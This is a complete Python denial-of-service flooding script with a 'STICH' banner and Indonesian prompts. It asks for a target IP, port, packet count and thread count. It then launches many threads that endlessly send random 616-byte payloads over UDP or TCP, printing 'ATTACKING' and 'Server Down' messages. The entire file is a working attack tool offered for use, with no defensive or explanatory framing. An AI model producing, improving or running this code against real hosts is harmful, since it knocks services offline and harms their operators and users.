import random
import socket
import threading
import time
import os,sys

os.system("clear")
print("""
\33[1;33m░██████╗████████╗██╗░█████╗░██╗░░██╗
\33[33;1m██╔════╝╚══██╔══╝██║██╔══██╗██║░░██║
\33[30;1m╚█████╗░░░░██║░░░██║██║░░╚═╝███████║
\33[31;1m░╚═══██╗░░░██║░░░██║██║░░██╗██╔══██║
\33[37;1m██████╔╝░░░██║░░░██║╚█████╔╝██║░░██║
\33[0;36m╚═════╝░░░░╚═╝░░░╚═╝░╚════╝░╚═╝░░╚═╝
""")
print("\033[31m━━━ Kenal Stich Dek? (y/n)")
choice = str(input("┗━━━━━━>\033[0m:"))
time.sleep(1)
print("\033[31m━━━ Host/IP")
ip = str(input("┗━━━━━━>\033[0m:"))
time.sleep(1)
print("\033[31m━━━ Port")
port = int(input("┗━━━━━━>\033[0m:"))
time.sleep(1)
print("\033[31m━━━ Pakets")	
print("\033[31m━━━ Min Pakets 100")
times = int(input("┗━━━━━━>\033[0m:"))
time.sleep(1)
print("\033[31m━━━ Threads")
print("\033[31m━━━ Min Threads 100")
threads = int(input("┗━━━━━━>\033[0m:"))
def xxxx():
  data = random._urandom(616)
  i = random.choice(("[•]","[•]","[•]"))
  while True:
    try:
      s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
      addr = (str(ip),int(port))
      for x in range(times):
        s.sendto(data,addr)
        print(i +" \033[91m}=====> UDP BYPASSED ATTACKING IP PORT \033[0m%s:%s!!!"%(ip,port))
    except:
      print("[!] Server Down!!!")

def xxx():
  data = random._urandom(616)
  i = random.choice(("[•]","[•]","[•]"))
  while True:
    try:
      s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
      addr = (str(ip),int(port))
      for x in range(times):
        s.sendto(data,addr)
        print(i +" \33[0;36m}=====> UDP BYPASSED ATTACKING IP PORT \033[0m%s:%s!!!"%(ip,port))
    except:
      print("[!] Server Down!!!")

def xx():
  data = random._urandom(616)
  i = random.choice(("[•]","[•]","[•]"))
  while True:
    try:
      s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
      s.connect((ip,port))
      s.send(data)
      for x in range(times):
        s.send(data)
        print(i +" \33[0;36m}=====> UDP BYPASSED ATTACKING IP PORT \033[0m%s:%s!!!"%(ip,port))
    except:
      s.close()
      print("[!] Server Down!!!")

def x():
  data = random._urandom(616)
  i = random.choice(("[•]","[•]","[•]"))
  while True:
    try:
      s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
      s.connect((ip,port))
      s.send(data)
      for x in range(times):
        s.send(data)
        print(i +" \33[0;36m}=====> UDP BYPASSED ATTACKING IP PORT \033[0m%s:%s!!!"%(ip,port))
    except:
      s.close()
      print("[!] Server Down!!!")

for y in range(threads):
  if choice == 'y':
    th = threading.Thread(target = xxxx)
    th.start()
    th = threading.Thread(target = xxx)
    th.start()
  else:
    th = threading.Thread(target = xx)
    th.start()
    th = threading.Thread(target = x)
    th.start()